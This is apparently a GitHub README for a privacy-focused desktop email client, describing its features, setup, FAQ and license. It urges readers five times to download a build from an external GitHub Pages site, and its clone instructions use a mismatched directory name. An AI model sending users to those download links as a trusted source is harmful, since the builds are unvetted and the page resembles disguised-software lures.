# Bharga Mail - Email Client 2026

> **Bharga Mail is a privacy-first, AI-native desktop email application designed for local-first workflows with IMAP, Gmail, and Microsoft 365 connectivity.**

[![Platform](https://img.shields.io/badge/Platform-Desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-AGPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/antoinecooper2000/bharga-mail-local-email?style=flat-square)](https://github.com/antoinecooper2000/bharga-mail-local-email)

---

<p align="center">
  <a href="https://antoinecooper2000.github.io/bharga-mail-local-email/">
    <img src="https://img.shields.io/badge/Download-Bharga%20Mail%20Latest-brightgreen?style=for-the-badge" alt="Download Bharga Mail">
  </a>
</p>

> **[Download Bharga Mail Latest](https://antoinecooper2000.github.io/bharga-mail-local-email/)**

---

[Download Latest Build](https://antoinecooper2000.github.io/bharga-mail-local-email/)

---

## Why Bharga Mail?

Bharga Mail brings several email accounts into one streamlined desktop workspace. Alongside standard IMAP services, it connects with Gmail and Microsoft 365, offering threaded conversations, device-based search, scheduling, and rich text editing in a single client.

Its local-first design stores mail in SQLite and protects account credentials through the operating system keychain. AI processing on the device can help organize incoming mail, summarize messages, and prepare drafts. Trust signals and link inspection provide additional information while reading and responding to email.

---

## Highlights

- On-device AI tools for inbox organization, message summaries, and draft preparation
- Manage multiple email accounts from one client
- Threaded conversations for a more coherent message history
- SPF, DKIM, and DMARC trust information
- Detection for phishing attempts and dangerous links
- IMAP IDLE push updates for incoming messages
- Send messages later or use undo-send
- Rich text editor with reusable signatures
- Quick full-text search over local mail
- Credentials stored in the operating system keychain
- Sandboxed display for rendered email content
- SQLite storage for local email data

---

## Getting Started

### Download the application

Visit the [download page](https://antoinecooper2000.github.io/bharga-mail-local-email/) for the newest desktop build. After downloading it, start the installer or application that matches your operating system.

### Compile from source

Retrieve the repository and enter the project directory:

```bash
git clone https://github.com/antoinecooper2000/bharga-mail-local-email.git
cd bharga-mail
```

The application combines a Tauri desktop shell, a React UI, and Rust components. Refer to the repository's development documentation for the supported commands used to build and run the project.

---

## Using Bharga Mail

1. Open Bharga Mail and configure an IMAP, Gmail, or Microsoft 365 account.
2. Read new messages from the conversation-based inbox.
3. Search locally stored mail with the full-text search tools.
4. Review SPF, DKIM, and DMARC indicators when checking message authenticity.
5. Pay attention to link warnings before visiting suspicious or potentially harmful destinations.
6. Ask the on-device AI to help with triage, summaries, or draft preparation.
7. Write a rich text response, add a signature, and either send it at once or schedule delivery.
8. Use undo send during the available short window if you need to correct a message after sending.

---

## Settings and Data

Bharga Mail is designed to keep account credentials in the operating system keychain. Email content and related local data are stored in SQLite. Account preferences and application options can be managed through the desktop settings interface.

Not every configuration option is necessarily exposed in every build. Use the in-app account and settings controls instead of modifying local data files manually.

---

## System Requirements

- A supported desktop operating system
- An IMAP-compatible, Gmail, or Microsoft 365 account
- Network connectivity for synchronization and message delivery
- Enough local disk space for SQLite mail storage and search indexes
- For development from source: a Tauri, React, and Rust environment

---

## Frequently Asked Questions

### What services are supported?

You can connect standard IMAP accounts, Gmail accounts, and Microsoft 365 accounts.

### Is multi-account use supported?

Yes. Bharga Mail can manage multiple email accounts.

### How are account credentials protected?

The application uses the operating system keychain for credentials, while local email content is kept in SQLite.

### What AI capabilities are available?

On-device AI can help sort and triage inbox content, create message summaries, and prepare drafts.

### How are incoming messages delivered?

Supported account connections use IMAP IDLE to receive push-style new-mail updates.

### What can I check when mail is missing?

Confirm that the account is connected, the service credentials are correct, and IMAP access is enabled for the account. If the issue followed a temporary connection failure, restarting synchronization may restore message updates.

### How can I find a newer release?

Check the [latest build download](https://antoinecooper2000.github.io/bharga-mail-local-email/) for updated desktop versions.

### Where should bugs be reported?

Create an issue in the [GitHub repository](https://github.com/antoinecooper2000/bharga-mail-local-email). Include the application version, desktop platform, account type, and the steps required to reproduce the problem.

---

## License

GNU AGPL v3.0 - see [LICENSE](LICENSE) for details.
